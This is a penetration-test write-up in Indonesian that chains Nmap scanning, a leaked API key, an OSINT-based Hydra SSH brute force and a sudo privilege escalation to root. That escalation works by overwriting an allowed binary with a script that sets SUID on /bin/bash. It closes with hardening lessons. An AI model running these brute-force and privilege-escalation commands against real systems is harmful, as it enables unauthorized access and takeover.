Audit // AS-001

API to Root

Executive Summary

"Operasi ini mendemonstrasikan bagaimana satu titik lemah pada dokumentasi teknis (API Leak) dapat dieksploitasi secara berantai menggunakan teknik OSINT dan manipulasi sistem file untuk mendapatkan kendali penuh (Root) pada infrastruktur server internal."

01

/ Reconnaissance & Service Discovery

Pemindaian menyeluruh dilakukan menggunakan Nmap untuk memetakan permukaan serangan (attack surface). Ditemukan tiga layanan aktif yang menarik perhatian:

# nmap -sC -sV -oN recon.txt target.internal
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1
80/tcp open http Apache httpd 2.4.41
8000/tcp open http Gunicorn (Analysis Framework)
02

/ Initial Access: The API Key Leak

Layanan pada port 8000 merupakan framework analisis mobile. Akses ke /api_docs membocorkan API Key administratif. Menggunakan kunci ini, kami mengunggah file dummy untuk memicu error sistem.

// Response Error Analysis
[ERROR] Failed to process payload.
Traceback: File "/home/internal_dev/analysis_engine/app.py", line 42...
[!] Leak Detected: Found username 'internal_dev'
03

/ Weaponized OSINT: Obtaining Shell

Melalui riset profil pengembang pada blog perusahaan, ditemukan ketertarikan pada sejarah tertentu. Data kota kelahiran diolah menjadi wordlist. Serangan brute-force SSH dilakukan menggunakan Hydra.

# targeted brute force attack
$ hydra -l internal_dev -P custom_list.txt ssh://target.internal
[22][ssh] host: target.internal login: internal_dev password: BirthCity1573
$ ssh internal_dev@target.internal
internal_dev@server:~$ id
uid=1001(internal_dev) gid=1001(internal_dev) groups=1001...
04

/ Privilege Escalation: Sudo Hijacking

Pemeriksaan sudo -l mengungkap izin eksekusi tool audit tanpa password. Namun, biner tersebut berada dalam direktori home yang dapat ditulis (writable). Kami memindahkan biner asli dan menggantinya dengan script pemberi akses Root.

# Hijacking the authorized path
mv ~/engine/audit_tool ~/engine/audit_tool_bak
echo -e '#!/bin/bash\nchmod +s /bin/bash' > ~/engine/audit_tool
chmod +x ~/engine/audit_tool
sudo /home/internal_dev/engine/audit_tool
internal_dev@server:~$ bash -p
root# whoami && id
root (uid=0)

05 LESSONS LEARNED

API Hardening

Jangan biarkan dokumentasi API administratif dapat diakses tanpa autentikasi.

Secure Sudo

Hindari memberikan izin sudo pada file di direktori yang dapat dimodifikasi oleh user.

Privacy Aware

Data personal pengembang dapat digunakan sebagai senjata OSINT untuk memicu serangan auth.
